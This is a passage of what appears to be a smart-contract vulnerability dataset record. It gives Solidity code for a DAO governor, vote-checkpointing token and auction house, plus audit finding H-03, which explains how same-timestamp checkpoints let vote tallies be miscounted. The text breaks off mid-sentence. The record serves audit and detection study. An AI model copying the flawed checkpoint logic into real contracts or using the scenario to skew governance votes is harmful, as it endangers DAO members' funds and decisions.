// If the proposal was queued:\n        if (settings.treasury.isQueued(_proposalId)) {\n            // Cancel the proposal\n            settings.treasury.cancel(_proposalId);\n        }\n\n        emit ProposalCanceled(_proposalId);\n    }\n\n    ///                                                          ///\n    ///                        VETO PROPOSAL                     ///\n    ///                                                          ///\n\n    /// @notice Vetoes a proposal\n    /// @param _proposalId The proposal id\n    function veto(bytes32 _proposalId) external {\n        // Ensure the caller is the vetoer\n        if (msg.sender != settings.vetoer) revert ONLY_VETOER();\n\n        // Ensure the proposal has not been executed\n        if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n\n        // Get the pointer to the proposal\n        Proposal storage proposal = proposals[_proposalId];\n\n        // Update the proposal as vetoed\n        proposal.vetoed = true;\n\n        // If the proposal was queued:\n        if (settings.treasury.isQueued(_proposalId)) {\n            // Cancel the proposal\n            settings.treasury.cancel(_proposalId);\n        }\n\n        emit ProposalVetoed(_proposalId);\n    }\n\n    ///                                                          ///\n    ///                        PROPOSAL STATE                    ///\n    ///                                                          ///\n\n    /// @notice The state of a proposal\n    /// @param _proposalId The proposal id\n    function state(bytes32 _proposalId) public view returns (ProposalState) {\n        // Get a copy of the proposal\n        Proposal memory proposal = proposals[_proposalId];\n\n        // Ensure the proposal exists\n        if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();\n\n        // If the proposal was executed:\n        if (proposal.executed) {\n            return ProposalState.Executed;\n\n            // Else if the proposal was canceled:\n        } else if (proposal.canceled) {\n            return ProposalState.Canceled;\n\n            // Else if the proposal was vetoed:\n        } else if (proposal.vetoed) {\n            return ProposalState.Vetoed;\n\n            // Else if voting has not started:\n        } else if (block.timestamp < proposal.voteStart) {\n            return ProposalState.Pending;\n\n            // Else if voting has not ended:\n        } else if (block.timestamp < proposal.voteEnd) {\n            return ProposalState.Active;\n\n            // Else if the proposal failed (outvoted OR didn't reach quorum):\n        } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n            return ProposalState.Defeated;\n\n            // Else if the proposal has not been queued:\n        } else if (settings.treasury.timestamp(_proposalId) == 0) {\n            return ProposalState.Succeeded;\n\n            // Else if the proposal can no longer be executed:\n        } else if (settings.treasury.isExpired(_proposalId)) {\n            return ProposalState.Expired;\n\n            // Else the proposal is queued\n        } else {\n            return ProposalState.Queued;\n        }\n    }\n\n    /// @notice The voting weight of an account at a timestamp\n    /// @param _account The account address\n    /// @param _timestamp The specific timestamp\n    function getVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n        return settings.token.getPastVotes(_account, _timestamp);\n    }\n\n    /// @notice The current number of votes required to submit a proposal\n    function proposalThreshold() public view returns (uint256) {\n        unchecked {\n            return (settings.token.totalSupply() * settings.proposalThresholdBps) / 10_000;\n        }\n    }\n\n    /// @notice The current number of votes required to be in favor of a proposal in order to reach quorum\n    function quorum() public view returns (uint256) {\n        unchecked {\n            return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;\n        }\n    }\n\n    /// @notice The data stored for a given proposal\n    /// @param _proposalId The proposal id\n    function getProposal(bytes32 _proposalId) external view returns (Proposal memory) {\n        return proposals[_proposalId];\n    }\n\n    /// @notice The timestamp when voting starts for a proposal\n    /// @param _proposalId The proposal id\n    function proposalSnapshot(bytes32 _proposalId) external view returns (uint256) {\n        return proposals[_proposalId].voteStart;\n    }\n\n    /// @notice The timestamp when voting ends for a proposal\n    /// @param _proposalId The proposal id\n    function proposalDeadline(bytes32 _proposalId) external view returns (uint256) {\n        return proposals[_proposalId].voteEnd;\n    }\n\n    /// @notice The vote counts for a proposal\n    /// @param _proposalId The proposal id\n    function proposalVotes(bytes32 _proposalId)\n        external\n        view\n        returns (\n            uint256,\n            uint256,\n            uint256\n        )\n    {\n        Proposal memory proposal = proposals[_proposalId];\n\n        return (proposal.againstVotes, proposal.forVotes, proposal.abstainVotes);\n    }\n\n    /// @notice The timestamp valid to execute a proposal\n    /// @param _proposalId The proposal id\n    function proposalEta(bytes32 _proposalId) external view returns (uint256) {\n        return settings.treasury.timestamp(_proposalId);\n    }\n\n    ///                                                          ///\n    ///                      GOVERNOR SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The basis points of the token supply required to create a proposal\n    function proposalThresholdBps() external view returns (uint256) {\n        return settings.proposalThresholdBps;\n    }\n\n    /// @notice The basis points of the token supply required to reach quorum\n    function quorumThresholdBps() external view returns (uint256) {\n        return settings.quorumThresholdBps;\n    }\n\n    /// @notice The amount of time until voting begins after a proposal is created\n    function votingDelay() external view returns (uint256) {\n        return settings.votingDelay;\n    }\n\n    /// @notice The amount of time to vote on a proposal\n    function votingPeriod() external view returns (uint256) {\n        return settings.votingPeriod;\n    }\n\n    /// @notice The address eligible to veto any proposal (address(0) if burned)\n    function vetoer() external view returns (address) {\n        return settings.vetoer;\n    }\n\n    /// @notice The address of the governance token\n    function token() external view returns (address) {\n        return address(settings.token);\n    }\n\n    /// @notice The address of the treasury\n    function treasury() external view returns (address) {\n        return address(settings.treasury);\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the voting delay\n    /// @param _newVotingDelay The new voting delay\n    function updateVotingDelay(uint256 _newVotingDelay) external onlyOwner {\n        emit VotingDelayUpdated(settings.votingDelay, _newVotingDelay);\n\n        settings.votingDelay = SafeCast.toUint48(_newVotingDelay);\n    }\n\n    /// @notice Updates the voting period\n    /// @param _newVotingPeriod The new voting period\n    function updateVotingPeriod(uint256 _newVotingPeriod) external onlyOwner {\n        emit VotingPeriodUpdated(settings.votingPeriod, _newVotingPeriod);\n\n        settings.votingPeriod = SafeCast.toUint48(_newVotingPeriod);\n    }\n\n    /// @notice Updates the minimum proposal threshold\n    /// @param _newProposalThresholdBps The new proposal threshold basis points\n    function updateProposalThresholdBps(uint256 _newProposalThresholdBps) external onlyOwner {\n        emit ProposalThresholdBpsUpdated(settings.proposalThresholdBps, _newProposalThresholdBps);\n\n        settings.proposalThresholdBps = SafeCast.toUint16(_newProposalThresholdBps);\n    }\n\n    /// @notice Updates the minimum quorum threshold\n    /// @param _newQuorumVotesBps The new quorum votes basis points\n    function updateQuorumThresholdBps(uint256 _newQuorumVotesBps) external onlyOwner {\n        emit QuorumVotesBpsUpdated(settings.quorumThresholdBps, _newQuorumVotesBps);\n\n        settings.quorumThresholdBps = SafeCast.toUint16(_newQuorumVotesBps);\n    }\n\n    /// @notice Updates the vetoer\n    /// @param _newVetoer The new vetoer address\n    function updateVetoer(address _newVetoer) external onlyOwner {\n        if (_newVetoer == address(0)) revert ADDRESS_ZERO();\n\n        emit VetoerUpdated(settings.vetoer, _newVetoer);\n\n        settings.vetoer = _newVetoer;\n    }\n\n    /// @notice Burns the vetoer\n    function burnVetoer() external onlyOwner {\n        emit VetoerUpdated(settings.vetoer, address(0));\n\n        delete settings.vetoer;\n    }\n\n    ///                                                          ///\n    ///                       GOVERNOR UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and that the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is a registered upgrade\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport { IERC721Votes } from \"../interfaces/IERC721Votes.sol\";\nimport { ERC721 } from \"../token/ERC721.sol\";\nimport { EIP712 } from \"../utils/EIP712.sol\";\n\n/// @title ERC721Votes\n/// @author Rohan Kulkarni\n/// @notice Modified from OpenZeppelin Contracts v4.7.3 (token/ERC721/extensions/draft-ERC721Votes.sol) & Nouns DAO ERC721Checkpointable.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Uses custom errors defined in IERC721Votes\n/// - Checkpoints are based on timestamps instead of block numbers\n/// - Tokens are self-delegated by default\n/// - The total number of votes is the token supply itself\nabstract contract ERC721Votes is IERC721Votes, EIP712, ERC721 {\n    ///                                                          ///\n    ///                          CONSTANTS                       ///\n    ///                                                          ///\n\n    /// @dev The EIP-712 typehash to delegate with a signature\n    bytes32 internal constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address from,address to,uint256 nonce,uint256 deadline)\");\n\n    ///                                                          ///\n    ///                           STORAGE                        ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @notice Account => Delegate\n    mapping(address => address) internal delegation;\n\n    /// @notice The number of checkpoints for an account\n    /// @dev Account => Num Checkpoints\n    mapping(address => uint256) internal numCheckpoints;\n\n    /// @notice The checkpoint for an account\n    /// @dev Account => Checkpoint Id => Checkpoint\n    mapping(address => mapping(uint256 => Checkpoint)) internal checkpoints;\n\n    ///                                                          ///\n    ///                        VOTING WEIGHT                     ///\n    ///                                                          ///\n\n    /// @notice The current number of votes for an account\n    /// @param _account The account address\n    function getVotes(address _account) public view returns (uint256) {\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // Cannot underflow as `nCheckpoints` is ensured to be greater than 0 if reached\n        unchecked {\n            // Return the number of votes at the latest checkpoint if applicable\n            return nCheckpoints != 0 ? checkpoints[_account][nCheckpoints - 1].votes : 0;\n        }\n    }\n\n    /// @notice The number of votes for an account at a past timestamp\n    /// @param _account The account address\n    /// @param _timestamp The past timestamp\n    function getPastVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n        // Ensure the given timestamp is in the past\n        if (_timestamp >= block.timestamp) revert INVALID_TIMESTAMP();\n\n        // Get the account's number of checkpoints\n        uint256 nCheckpoints = numCheckpoints[_account];\n\n        // If there are none return 0\n        if (nCheckpoints == 0) return 0;\n\n        // Get the account's checkpoints\n        mapping(uint256 => Checkpoint) storage accountCheckpoints = checkpoints[_account];\n\n        unchecked {\n            // Get the latest checkpoint id\n            // Cannot underflow as `nCheckpoints` is ensured to be greater than 0\n            uint256 lastCheckpoint = nCheckpoints - 1;\n\n            // If the latest checkpoint has a valid timestamp, return its number of votes\n            if (accountCheckpoints[lastCheckpoint].timestamp <= _timestamp) return accountCheckpoints[lastCheckpoint].votes;\n\n            // If the first checkpoint doesn't have a valid timestamp, return 0\n            if (accountCheckpoints[0].timestamp > _timestamp) return 0;\n\n            // Otherwise, find a checkpoint with a valid timestamp\n            // Use the latest id as the initial upper bound\n            uint256 high = lastCheckpoint;\n            uint256 low;\n            uint256 middle;\n\n            // Used to temporarily hold a checkpoint\n            Checkpoint memory cp;\n\n            // While a valid checkpoint is to be found:\n            while (high > low) {\n                // Find the id of the middle checkpoint\n                middle = high - (high - low) / 2;\n\n                // Get the middle checkpoint\n                cp = accountCheckpoints[middle];\n\n                // If the timestamp is a match:\n                if (cp.timestamp == _timestamp) {\n                    // Return the voting weight\n                    return cp.votes;\n\n                    // Else if the timestamp is before the one looking for:\n                } else if (cp.timestamp < _timestamp) {\n                    // Update the lower bound\n                    low = middle;\n\n                    // Else update the upper bound\n                } else {\n                    high = middle - 1;\n                }\n            }\n\n            return accountCheckpoints[low].votes;\n        }\n    }\n\n    ///                                                          ///\n    ///                          DELEGATION                      ///\n    ///                                                          ///\n\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) external view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n\n    /// @notice Delegates votes from a signer to an account\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _deadline The signature deadline\n    /// @param _v The 129th byte and chain id of the signature\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function delegateBySig(\n        address _from,\n        address _to,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        // Ensure the signature has not expired\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the hash of the domain seperator with the typed delegation data\n            digest = keccak256(\n                abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the voter\n        if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();\n\n        // Update the delegate\n        _delegate(_from, _to);\n    }\n\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n    /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n\n    /// @dev Records a checkpoint\n    /// @param _account The account address\n    /// @param _id The checkpoint id\n    /// @param _prevTotalVotes The account's previous voting weight\n    /// @param _newTotalVotes The account's new voting weight\n    function _writeCheckpoint(\n        address _account,\n        uint256 _id,\n        uint256 _prevTotalVotes,\n        uint256 _newTotalVotes\n    ) private {\n        // Get the pointer to store the checkpoint\n        Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n        // Record the updated voting weight and current time\n        checkpoint.votes = uint192(_newTotalVotes);\n        checkpoint.timestamp = uint64(block.timestamp);\n\n        emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n    }\n\n    /// @dev Enables each NFT to equal 1 vote\n    /// @param _from The token sender\n    /// @param _to The token recipient\n    /// @param _tokenId The ERC-721 token id\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n        super._afterTokenTransfer(_from, _to, _tokenId);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { UUPS } from \"../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../lib/utils/Ownable.sol\";\nimport { ReentrancyGuard } from \"../lib/utils/ReentrancyGuard.sol\";\nimport { Pausable } from \"../lib/utils/Pausable.sol\";\nimport { SafeCast } from \"../lib/utils/SafeCast.sol\";\n\nimport { AuctionStorageV1 } from \"./storage/AuctionStorageV1.sol\";\nimport { Token } from \"../token/Token.sol\";\nimport { IManager } from \"../manager/IManager.sol\";\nimport { IAuction } from \"./IAuction.sol\";\nimport { IWETH } from \"../lib/interfaces/IWETH.sol\";\n\n/// @title Auction\n/// @author Rohan Kulkarni\n/// @notice A DAO's auction house\n/// Modified from:\n/// - NounsAuctionHouse.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Zora V3 ReserveAuctionCoreEth module commit 795aeca - licensed under the GPL-3.0 license.\ncontract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionStorageV1 {\n    ///                                                          ///\n    ///                          IMMUTABLES                      ///\n    ///                                                          ///\n\n    /// @notice The address of WETH\n    address private immutable WETH;\n\n    /// @notice The contract upgrade manager\n    IManager private immutable manager;\n\n    ///                                                          ///\n    ///                          CONSTRUCTOR                     ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    /// @param _weth The address of WETH\n    constructor(address _manager, address _weth) payable initializer {\n        manager = IManager(_manager);\n        WETH = _weth;\n    }\n\n    ///                                                          ///\n    ///                          INITIALIZER                     ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's auction contract\n    /// @param _token The ERC-721 token address\n    /// @param _founder The founder responsible for starting the first auction\n    /// @param _treasury The treasury address where ETH will be sent\n    /// @param _duration The duration of each auction\n    /// @param _reservePrice The reserve price of each auction\n    function initialize(\n        address _token,\n        address _founder,\n        address _treasury,\n        uint256 _duration,\n        uint256 _reservePrice\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Grant initial ownership to a founder\n        __Ownable_init(_founder);\n\n        // Pause the contract until the first auction\n        __Pausable_init(true);\n\n        // Store DAO's ERC-721 token\n        token = Token(_token);\n\n        // Store the auction house settings\n        settings.duration = SafeCast.toUint40(_duration);\n        settings.reservePrice = _reservePrice;\n        settings.treasury = _treasury;\n        settings.timeBuffer = 5 minutes;\n        settings.minBidIncrement = 10;\n    }\n\n    ///                                                          ///\n    ///                          CREATE BID                      ///\n    ///                                                          ///\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBid(uint256 _tokenId) external payable nonReentrant {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the bid is for the current token\n        if (_auction.tokenId != _tokenId) revert INVALID_TOKEN_ID();\n\n        // Ensure the auction is still active\n        if (block.timestamp >= _auction.endTime) revert AUCTION_OVER();\n\n        // Cache the address of the highest bidder\n        address highestBidder = _auction.highestBidder;\n\n        // If this is the first bid:\n        if (highestBidder == address(0)) {\n            // Ensure the bid meets the reserve price\n            if (msg.value < settings.reservePrice) revert RESERVE_PRICE_NOT_MET();\n\n            // Else this is a subsequent bid:\n        } else {\n            // Cache the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // Used to store the minimum bid required\n            uint256 minBid;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the minimum bid\n                minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100);\n            }\n\n            // Ensure the incoming bid meets the minimum\n            if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();\n\n            // Refund the previous bidder\n            _handleOutgoingTransfer(highestBidder, highestBid);\n        }\n\n        // Store the new highest bid\n        auction.highestBid = msg.value;\n\n        // Store the new highest bidder\n        auction.highestBidder = msg.sender;\n\n        // Used to store if the auction will be extended\n        bool extend;\n\n        // Cannot underflow as `_auction.endTime` is ensured to be greater than the current time above\n        unchecked {\n            // Compute whether the time remaining is less than the buffer\n            extend = (_auction.endTime - block.timestamp) < settings.timeBuffer;\n        }\n\n        // If the time remaining is within the buffer:\n        if (extend) {\n            // Cannot realistically overflow\n            unchecked {\n                // Extend the auction by the time buffer\n                auction.endTime = uint40(block.timestamp + settings.timeBuffer);\n            }\n        }\n\n        emit AuctionBid(_tokenId, msg.sender, msg.value, extend, auction.endTime);\n    }\n\n    ///                                                          ///\n    ///                    SETTLE & CREATE AUCTION               ///\n    ///                                                          ///\n\n    /// @notice Settles the current auction and creates the next one\n    function settleCurrentAndCreateNewAuction() external nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /// @dev Settles the current auction\n    function _settleAuction() private {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the auction wasn't already settled\n        if (auction.settled) revert AUCTION_SETTLED();\n\n        // Ensure the auction had started\n        if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n\n        // Ensure the auction is over\n        if (block.timestamp < _auction.endTime) revert AUCTION_ACTIVE();\n\n        // Mark the auction as settled\n        auction.settled = true;\n\n        // If a bid was placed:\n        if (_auction.highestBidder != address(0)) {\n            // Cache the amount of the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // If the highest bid included ETH: Transfer it to the DAO treasury\n            if (highestBid != 0) _handleOutgoingTransfer(settings.treasury, highestBid);\n\n            // Transfer the token to the highest bidder\n            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);\n\n            // Else no bid was placed:\n        } else {\n            // Burn the token\n            token.burn(_auction.tokenId);\n        }\n\n        emit AuctionSettled(_auction.tokenId, _auction.highestBidder, _auction.highestBid);\n    }\n\n    /// @dev Creates an auction for the next token\n    function _createAuction() private {\n        // Get the next token available for bidding\n        try token.mint() returns (uint256 tokenId) {\n            // Store the token id\n            auction.tokenId = tokenId;\n\n            // Cache the current timestamp\n            uint256 startTime = block.timestamp;\n\n            // Used to store the auction end time\n            uint256 endTime;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the auction end time\n                endTime = startTime + settings.duration;\n            }\n\n            // Store the auction start and end time\n            auction.startTime = uint40(startTime);\n            auction.endTime = uint40(endTime);\n\n            // Reset data from the previous auction\n            auction.highestBid = 0;\n            auction.highestBidder = address(0);\n            auction.settled = false;\n\n            emit AuctionCreated(tokenId, startTime, endTime);\n\n            // Pause the contract if token minting failed\n        } catch Error(string memory) {\n            _pause();\n        }\n    }\n\n    ///                                                          ///\n    ///                             PAUSE                        ///\n    ///                                                          ///\n\n    /// @notice Unpauses the auction house\n    function unpause() external onlyOwner {\n        _unpause();\n\n        // If this is the first auction:\n        if (auction.tokenId == 0) {\n            // Transfer ownership of the contract to the DAO\n            transferOwnership(settings.treasury);\n\n            // Start the first auction\n            _createAuction();\n        }\n        // Else if the contract was paused and the previous auction was settled:\n        else if (auction.settled) {\n            // Start the next auction\n            _createAuction();\n        }\n    }\n\n    /// @notice Pauses the auction house\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /// @notice Settles the latest auction when the contract is paused\n    function settleAuction() external nonReentrant whenPaused {\n        _settleAuction();\n    }\n\n    ///                                                          ///\n    ///                       AUCTION SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The DAO treasury\n    function treasury() external view returns (address) {\n        return settings.treasury;\n    }\n\n    /// @notice The time duration of each auction\n    function duration() external view returns (uint256) {\n        return settings.duration;\n    }\n\n    /// @notice The reserve price of each auction\n    function reservePrice() external view returns (uint256) {\n        return settings.reservePrice;\n    }\n\n    /// @notice The minimum amount of time to place a bid during an active auction\n    function timeBuffer() external view returns (uint256) {\n        return settings.timeBuffer;\n    }\n\n    /// @notice The minimum percentage an incoming bid must raise the highest bid\n    function minBidIncrement() external view returns (uint256) {\n        return settings.minBidIncrement;\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the time duration of each auction\n    /// @param _duration The new time duration\n    function setDuration(uint256 _duration) external onlyOwner {\n        settings.duration = SafeCast.toUint40(_duration);\n\n        emit DurationUpdated(_duration);\n    }\n\n    /// @notice Updates the reserve price of each auction\n    /// @param _reservePrice The new reserve price\n    function setReservePrice(uint256 _reservePrice) external onlyOwner {\n        settings.reservePrice = _reservePrice;\n\n        emit ReservePriceUpdated(_reservePrice);\n    }\n\n    /// @notice Updates the time buffer of each auction\n    /// @param _timeBuffer The new time buffer\n    function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {\n        settings.timeBuffer = SafeCast.toUint40(_timeBuffer);\n\n        emit TimeBufferUpdated(_timeBuffer);\n    }\n\n    /// @notice Updates the minimum bid increment of each subsequent bid\n    /// @param _percentage The new percentage\n    function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {\n        settings.minBidIncrement = SafeCast.toUint8(_percentage);\n\n        emit MinBidIncrementPercentageUpdated(_percentage);\n    }\n\n    ///                                                          ///\n    ///                        TRANSFER UTIL                     ///\n    ///                                                          ///\n\n    /// @notice Transfer ETH/WETH from the contract\n    /// @param _to The recipient address\n    /// @param _amount The amount transferring\n    function _handleOutgoingTransfer(address _to, uint256 _amount) private {\n        // Ensure the contract has enough ETH to transfer\n        if (address(this).balance < _amount) revert INSOLVENT();\n\n        // Used to store if the transfer succeeded\n        bool success;\n\n        assembly {\n            // Transfer ETH to the recipient\n            // Limit the call to 50,000 gas\n            success := call(50000, _to, _amount, 0, 0, 0, 0)\n        }\n\n        // If the transfer failed:\n        if (!success) {\n            // Wrap as WETH\n            IWETH(WETH).deposit{ value: _amount }();\n\n            // Transfer WETH instead\n            IWETH(WETH).transfer(_to, _amount);\n        }\n    }\n\n    ///                                                          ///\n    ///                        AUCTION UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is registered by the Builder DAO\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}\n\n\n",
        "CodeNames": [
            "Governor.sol",
            "ERC721Votes.sol",
            "Auction.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\n/// @dev Records a checkpoint\n/// @param _account The account address\n/// @param _id The checkpoint id\n/// @param _prevTotalVotes The account's previous voting weight\n/// @param _newTotalVotes The account's new voting weight\nfunction _writeCheckpoint(\n    address _account,\n    uint256 _id,\n    uint256 _prevTotalVotes,\n    uint256 _newTotalVotes\n) private {\n    // Get the pointer to store the checkpoint\n    Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n    // Record the updated voting weight and current time\n    checkpoint.votes = uint192(_newTotalVotes);\n    checkpoint.timestamp = uint64(block.timestamp);\n\n    emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n}\n",
                    "//solidity\nweight = getVotes(_voter, proposal.timeCreated);\n",
                    "//solidity\nfunction getVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n    return settings.token.getPastVotes(_account, _timestamp);\n}\n"
                ],
                "Type": " Multiple vote checkpoints per block will lead to incorrect vote accounting",
                "Description": "\nVoting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of ERC721Votes creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.\n\n\nCheckpoints with the same timestamp will cause issues within the ERC721Votes.getPastVotes(..) function and will return incorrect votes for a given _timestamp.\n\n\nlib/token/ERC721Votes.sol#L252-L253(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253)\n\nsolidity\n/// @dev Records a checkpoint\n/// @param _account The account address\n/// @param _id The checkpoint id\n/// @param _prevTotalVotes The account's previous voting weight\n/// @param _newTotalVotes The account's new voting weight\nfunction _writeCheckpoint(\n    address _account,\n    uint256 _id,\n    uint256 _prevTotalVotes,\n    uint256 _newTotalVotes\n) private {\n    // Get the pointer to store the checkpoint\n    Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n    // Record the updated voting weight and current time\n    checkpoint.votes = uint192(_newTotalVotes);\n    checkpoint.timestamp = uint64(block.timestamp);\n\n    emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n}\n\n\nConsider the following example and the votes checkpoint snapshots:\n\n*Note: Bob owns a smart contract used to interact with the protocol*\n\nTransaction 0: Bob's smart contract receives 1 NFT through minting (1 NFT equals 1 vote)\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------| --------| ----|\n| 0                | 0         | 1     |\n\nTransaction 1: Bob's smart contract receives one more NFT through minting\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------| --------| ----|\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n\nTransaction 1: Within the same transaction 1, Bob's smart-contract delegates 2 votes to Alice\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------| --------| ----|\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n| 2                | 1         | 0     |\n\nTransaction 1: Again within the same transaction 1, Bob's smart contract decides to reverse the delegation and self-delegates\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------| --------| ----|\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n| 2                | 1         | 0     |\n| 3                | 1         | 2     |\n\nTransaction 1: Bob's smart contract buys one more NFT\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------| --------| ----|\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n| 2                | 1         | 0     |\n| 3                | 1         | 2     |\n| 4                | 2         | 3     |\n\nBob now wants to vote (via his smart contract) on a governance proposal that has been created on timeCreated = 1 (timestamp 1).\n\nInternally, the Governor._castVote function determines the voter's weight by calling getVotes(_voter, 